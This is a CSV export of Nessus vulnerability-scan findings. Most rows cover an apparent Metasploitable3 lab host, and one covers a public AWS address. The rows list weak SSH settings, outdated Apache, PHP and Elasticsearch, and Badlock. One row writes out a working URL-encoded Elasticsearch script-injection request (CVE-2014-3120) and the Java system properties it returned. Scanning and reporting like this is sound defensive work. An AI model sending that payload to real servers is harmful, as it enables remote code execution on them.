Asset ID,Asset,Finding,Description,Risk Factor,Solution,Original Risk Factor,Date Discovered,Last seen,Status,Ignored,Tool output,Ignored,Is New,Last Comment,Tickets,Ticket Age,Location,CVSS Score,Data Type,Exploit Available,None,Vulnerability Id,Identification Numbers,Cvss v2 score,Cvss v3 score,Fix version,Format,Ins version,Modification date,Nvd cvss2 vectors,Nvd cvss3 vectors,Nvd url,Pkg name,Pkg path,Publish date,Closed Tickets,Group Counter
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,SSH Weak Key Exchange Algorithms Enabled,"The remote SSH server is configured to allow key exchange algorithms which are considered weak.This is based on the IETF draft document Key Exchange (KEX) Method Updates and Recommendations for Secure Shell (SSH) RFC9142. Section 4 lists guidance on key exchange algorithms that SHOULD NOT and MUST NOT be enabled. This includes:  diffie-hellman-group-exchange-sha1  diffie-hellman-group1-sha1  gss-gex-sha1-*  gss-group1-sha1-*  gss-group14-sha1-*  rsa1024-sha1Note that this plugin only checks for the options of the SSH server, and it does not check for vulnerable software versions.",Low,Contact the vendor or consult product documentation to disable the weak algorithms.,Low,2024-04-29T15:44:06.109580Z,2024-04-29T15:44:04.709097Z,Active,False,"
The following weak key exchange algorithms are enabled : 

  diffie-hellman-group1-sha1
",False,True,-,0,-,49255,2.6,nessus,False,,68f7aad2-9c53-43a5-9a4f-7a43a716d052,,,,,,,,,,,,,,0,None
2e9c8ba9-1aae-41a5-aae9-8e56eb79fc25,35.81.188.86,PHP < 7.3.24 Multiple Vulnerabilities,"According to its self-reported version number, the version of PHP running on the remote web server is prior to 7.3.24. It is, therefore affected by multiple vulnerabilities",Medium,Upgrade to PHP version 7.3.24 or later.,Medium,2024-06-04T01:08:16.233151Z,2024-06-08T01:06:10.074179Z,Active,False,"
  URL               : http://ec2-35-81-188-86.us-west-2.compute.amazonaws.com:8080/ (7.1.26 under X-Powered-By: PHP/7.1.26)
  Installed version : 7.1.26
  Fixed version     : 7.3.24
",False,False,-,0,-,8080,5.0,nessus,False,,969a61fa-e91b-469e-8e07-a06d2a00d8b4,,,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,SSH Server CBC Mode Ciphers Enabled,The SSH server is configured to support Cipher Block Chaining (CBC) encryption.  This may allow an attacker to recover the plaintext message from the ciphertext. Note that this plugin only checks for the options of the SSH server and does not check for vulnerable software versions.,Low,"Contact the vendor or consult product documentation to disable CBC mode cipher encryption, and enable CTR or GCM cipher mode encryption.",Low,2024-04-29T15:44:06.111935Z,2024-04-29T15:44:04.709097Z,Active,False,"
The following client-to-server Cipher Block Chaining (CBC) algorithms
are supported : 

  3des-cbc
  aes128-cbc
  blowfish-cbc

The following server-to-client Cipher Block Chaining (CBC) algorithms
are supported : 

  3des-cbc
  aes128-cbc
  blowfish-cbc
",False,True,-,0,-,49255,2.6,nessus,False,,939234c4-2fc8-471b-84c5-489f746e2a2d,CVE-2008-5161,,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,SSH Weak MAC Algorithms Enabled,"The remote SSH server is configured to allow either MD5 or 96-bit MAC algorithms, both of which are considered weak.Note that this plugin only checks for the options of the SSH server, and it does not check for vulnerable software versions.",Low,Contact the vendor or consult product documentation to disable MD5 and 96-bit MAC algorithms.,Low,2024-04-29T15:44:06.110030Z,2024-04-29T15:44:04.709097Z,Active,False,"
The following client-to-server Message Authentication Code (MAC) algorithms
are supported : 

  hmac-md5
  hmac-md5-96
  hmac-sha1-96

The following server-to-client Message Authentication Code (MAC) algorithms
are supported : 

  hmac-md5
  hmac-md5-96
  hmac-sha1-96
",False,True,-,0,-,49255,2.6,nessus,False,,39f0c86c-aad3-446b-b13a-0725191dd21a,,,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,Elasticsearch Unrestricted Access Information Disclosure,"The Elasticsearch application running on the remote web server is affected by an information disclosure vulnerability due to a failure to restrict resources via authentication. An unauthenticated, remote attacker can exploit this to disclose sensitive information from the database.",Medium,Enable native user authentication or integrate with an external user management system such as LDAP and Active Directory.,Medium,2024-04-29T15:44:06.112941Z,2024-04-29T15:44:04.709097Z,Active,False,"Nessus detected an unprotected instance of Elasticsearch with the following indices :

 
 
 
 
 
 
 
5 
",False,True,-,0,-,9200,5.0,nessus,False,,ae17aaf3-e864-49d9-b19f-2daf8e0efe75,,,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,Apache 2.4.x < 2.4.56 Multiple Vulnerabilities,"The version of Apache httpd installed on the remote host is prior to 2.4.56. It is, therefore, affected by multiple vulnerabilities as referenced in the 2.4.56 advisory.  - HTTP request splitting with mod_rewrite and mod_proxy: Some mod_proxy configurations on Apache HTTP Server     versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected when     mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern     matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the     proxied request-target using variable substitution. For example, something like: RewriteEngine on     RewriteRule ^/here/(.*)  http://example.com:8080/elsewhere?$1 http://example.com:8080/elsewhere ; [P]     ProxyPassReverse /here/ http://example.com:8080/ http://example.com:8080/ Request splitting/smuggling     could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin     servers, and cache poisoning. Acknowledgements: finder: Lars Krapf of Adobe (CVE-2023-25690)  - Apache HTTP Server: mod_proxy_uwsgi HTTP response splitting: HTTP Response Smuggling vulnerability in     Apache HTTP Server via mod_proxy_uwsgi. This issue affects Apache HTTP Server: from 2.4.30 through 2.4.55.    Special characters in the origin response header can truncate/split the response forwarded to the client.    Acknowledgements: finder: Dimas Fariski Setyawan Putra (nyxsorcerer) (CVE-2023-27522)Note that Nessus has not tested for these issues but has instead relied only on the application's self-reported version number.",Critical,Upgrade to Apache version 2.4.56 or later.,Critical,2024-04-29T15:44:06.110929Z,2024-04-29T15:44:04.709097Z,Active,False,"
  URL               : http://10.0.0.13:8585/
  Installed version : 2.2.21
  Fixed version     : 2.4.56
",False,True,-,0,-,8585,10.0,nessus,True,,5d7a82dc-8f1d-4430-9774-7adb68c76055,"CVE-2023-27522, CVE-2023-25690",,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,MS16-047: Security Update for SAM and LSAD Remote Protocols (3148527) (Badlock) (uncredentialed check),"The remote Windows host is affected by an elevation of privilege vulnerability in the Security Account Manager (SAM) and Local Security Authority (Domain Policy) (LSAD) protocols due to improper authentication level negotiation over Remote Procedure Call (RPC) channels. A man-in-the-middle attacker able to intercept communications between a client and a server hosting a SAM database can exploit this to force the authentication level to downgrade, allowing the attacker to impersonate an authenticated user and access the SAM database.",Medium,"Microsoft has released a set of patches for Windows Vista, 2008, 7, 2008 R2, 2012, 8.1, RT 8.1, 2012 R2, and 10.",Medium,2024-04-29T15:44:06.110282Z,2024-04-29T15:44:04.709097Z,Active,False,None,False,True,-,0,-,49155,5.8,nessus,False,,785a418f-d9fd-40e0-a0c7-2c0861c043bb,CVE-2016-0128,,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,Elasticsearch 'source' Parameter RCE,"The Elasticsearch application hosted on the remote web server is affected by a remote code execution vulnerability due to a failure to properly sanitize user-supplied input to the 'source' parameter of the '/_search' page. A remote, unauthenticated attacker can exploit this flaw to execute arbitrary Java code or manipulate files on the remote host.",Medium,Upgrade to version 1.2.0 or later.,Medium,2024-04-29T15:44:06.112838Z,2024-04-29T15:44:04.709097Z,Active,False,"
Nessus was able to execute the command ""System.getProperties()"" using the
following request :

http://10.0.0.13:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22Java%20Properties%22%3A%7B%22script%22%3A%22import%20java.lang.*%3B%5CnSystem.getProperties()%3B%22%7D%7D%7D&callback=jQuery861175321_262372029&_=1963490623


This produced the following truncated output (limited to 25 lines) :
------------------------------ snip ------------------------------
jQuery861175321_262372029({""took"":31,""timed_out"":false,""_shards"":{""total"":65,""successful"":65,""failed"":0},""hits"":{""total"":1,""max_score"":1.0,""hits"":[{""_index"":""metasploitable3"",""_type"":""message"",""_id"":""1"",""_score"":1.0,""fields"":{""Java Properties"":[{""java.runtime.name"":""Java(TM) SE Runtime Environment"",""elasticsearch"":"""",""es.default.path.logs"":""C:\\Program Files\\elasticsearch-1.1.1\\logs"",""es.default.path.work"":""C:\\Program Files\\elasticsearch-1.1.1"",""sun.boot.library.path"":""C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\bin"",""java.vm.version"":""25.211-b12"",""es.path.home"":""C:\\Program Files\\elasticsearch-1.1.1"",""java.vm.vendor"":""Oracle Corporation"",""java.vendor.url"":""http://java.oracle.com/"",""path.separator"":"";"",""java.vm.name"":""Java HotSpot(TM) 64-Bit Server VM"",""file.encoding.pkg"":""sun.io"",""user.country"":""US"",""user.script"":"""",""sun.os.patch.level"":""Service Pack 1"",""java.vm.specification.name"":""Java Virtual Machine Specification"",""user.dir"":""C:\\Program Files\\elasticsearch-1.1.1"",""java.runtime.version"":""1.8.0_211-b12"",""es.default.path.conf"":""C:\\Program Files\\elasticsearch-1.1.1\\config"",""java.awt.graphicsenv"":""sun.awt.Win32GraphicsEnvironment"",""java.endorsed.dirs"":""C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\endorsed"",""os.arch"":""amd64"",""java.io.tmpdir"":""C:\\Windows\\TEMP\\"",""line.separator"":""\r\n"",""java.vm.specification.vendor"":""Oracle Corporation"",""user.variant"":"""",""os.name"":""Windows Server 2008 R2"",""es.default.path.data"":""C:\\Program Files\\elasticsearch-1.1.1\\data"",""sun.jnu.encoding"":""Cp1252"",""java.library.path"":""C:\\Program Files\\elasticsearch-1.1.1\\bin;C:\\Windows\\Sun\\Java\\bin;C:\\Windows\\system32;C:\\Windows;C:\\tools\\ruby23\\bin;C:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath;C:\\ProgramData\\Boxstarter;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\OpenSSH\\bin;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\ProgramData\\chocolatey\\bin;C:\\Program Files\\Java\\jdk1.8.0_211\\bin;;."",""sun.nio.ch.bugLevel"":"""",""java.specification.name"":""Java Platform API Specification"",""java.class.version"":""52.0"",""sun.management.compiler"":""HotSpot 64-Bit Tiered Compilers"",""es.default.config"":""C:\\Program Files\\elasticsearch-1.1.1\\config\\elasticsearch.yml"",""os.version"":""6.1"",""user.home"":""C:\\Windows\\system32\\config\\systemprofile"",""user.timezone"":""America/Los_Angeles"",""java.awt.printerjob"":""sun.awt.windows.WPrinterJob"",""file.encoding"":""Cp1252"",""java.specification.version"":""1.8"",""es.default.path.home"":""C:\\Program Files\\elasticsearch-1.1.1"",""es.logger.prefix"":"""",""java.class.path"":"";C:\\Program Files\\elasticsearch-1.1.1/lib/elasticsearch-1.1.1.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/elasticsearch-1.1.1.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/jna-3.3.0.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/jts-1.13.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/log4j-1.2.17.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-analyzers-common-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-codecs-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-core-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-grouping-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-highlighter-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-join-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-memory-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-misc-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-queries-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-queryparser-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-sandbox-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-spatial-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/lucene-suggest-4.7.2.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/spatial4j-0.4.1.jar;C:\\Program Files\\elasticsearch-1.1.1/lib/sigar/sigar-1.6.4.jar"",""user.name"":""VAGRANT-2008R2$"",""java.vm.specification.version"":""1.8"",""java.home"":""C:\\Program Files\\Java\\jdk1.8.0_211\\jre"",""sun.arch.data.model"":""64"",""user.language"":""en"",""java.specification.vendor"":""Oracle Corporation"",""awt.toolkit"":""sun.awt.windows.WToolkit"",""java.vm.info"":""mixed mode"",""java.version"":""1.8.0_211"",""java.ext.dirs"":""C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\ext;C:\\Windows\\Sun\\Java\\lib\\ext"",""sun.boot.class.path"":""C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\resources.jar;C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\rt.jar;C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\sunrsasign.jar;C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\jsse.jar;C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\jce.jar;C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\charsets.jar;C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\lib\\jfr.jar;C:\\Program Files\\Java\\jdk1.8.0_211\\jre\\classes"",""java.vendor"":""Oracle Corporation"",""file.separator"":""\\"",""java.vendor.url.bug"":""http://bugreport.sun.com/bugreport/"",""sun.io.unicode.encoding"":""UnicodeLittle"",""sun.cpu.endian"":""little"",""sun.desktop"":""windows"",""sun.cpu.isalist"":""amd64""}]}}]}});

------------------------------ snip ------------------------------
",False,True,-,0,-,9200,6.8,nessus,True,,4d8271b1-eb43-4ca8-a009-a5cdb3d63595,CVE-2014-3120,,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,Elasticsearch ESA-2015-06,Elasticsearch versions prior to 1.6.1 are vulnerable to an attack that can result in remote code execution.,High,"Users should upgrade to 1.6.1 or 1.7.0. Alternately, ensure that only trusted applications have access to the transport protocol port.",High,2024-04-29T15:44:06.112252Z,2024-04-29T15:44:04.709097Z,Active,False,"
  URL               : http://10.0.0.13:9200/
  Installed version : 1.1.1
  Fixed version     : 1.6.1 / 1.7.0
",False,True,-,0,-,9200,7.5,nessus,False,,4af12971-2a5b-471d-aa75-43e29e60565a,CVE-2015-5377,,,,,,,,,,,,,0,None
df426440-8fd3-49bf-879c-d1b652058e5d,10.0.0.13,Apache 2.4.x < 2.4.53 Multiple Vulnerabilities,"The version of Apache httpd installed on the remote host is prior to 2.4.53. It is, therefore, affected by multiple vulnerabilities as referenced in the 2.4.53 advisory.  - mod_lua Use of uninitialized value of in r:parsebody: A carefully crafted request body can cause a read to a     random memory area which could cause the process to crash.  This issue affects Apache HTTP Server 2.4.52     and earlier. Acknowledgements: Chamal De Silva (CVE-2022-22719)  - HTTP request smuggling: Apache HTTP Server 2.4.52 and earlier fails to close inbound connection when errors are     encountered discarding the request body, exposing the server to HTTP Request Smuggling Acknowledgements: James     Kettle <james.kettle portswigger.net> (CVE-2022-22720)  - Possible buffer overflow with very large or unlimited LimitXMLRequestBody in core: If LimitXMLRequestBody is set to     allow request bodies larger than 350MB (defaults to 1M) on 32 bit systems an integer overflow happens which later     causes out of bounds writes.  This issue affects Apache HTTP Server 2.4.52 and earlier. Acknowledgements: Anonymous     working with Trend Micro Zero Day Initiative (CVE-2022-22721)  - Read/write beyond bounds in mod_sed: Out-of-bounds Write vulnerability in mod_sed of Apache HTTP Server allows     an attacker to overwrite heap memory with possibly attacker provided data.  This issue affects Apache HTTP     Server 2.4 version 2.4.52 and prior versions. Acknowledgements: Ronald Crane (Zippenhop LLC)     (CVE-2022-23943)Note that Nessus has not tested for this issue but has instead relied only on the application's self-reported version number.",High,Upgrade to Apache version 2.4.53 or later.,High,2024-04-29T15:44:06.124706Z,2024-04-29T15:44:04.709097Z,Active,False,"
  URL               : http://10.0.0.13:8585/
  Installed version : 2.2.21
  Fixed version     : 2.4.53
",False,True,-,0,-,8585,7.5,nessus,True,,17c8987a-134c-44f1-b4fe-3f45d628a0ac,CVE-2022-23943,,,,,,,,,,,,,0,None
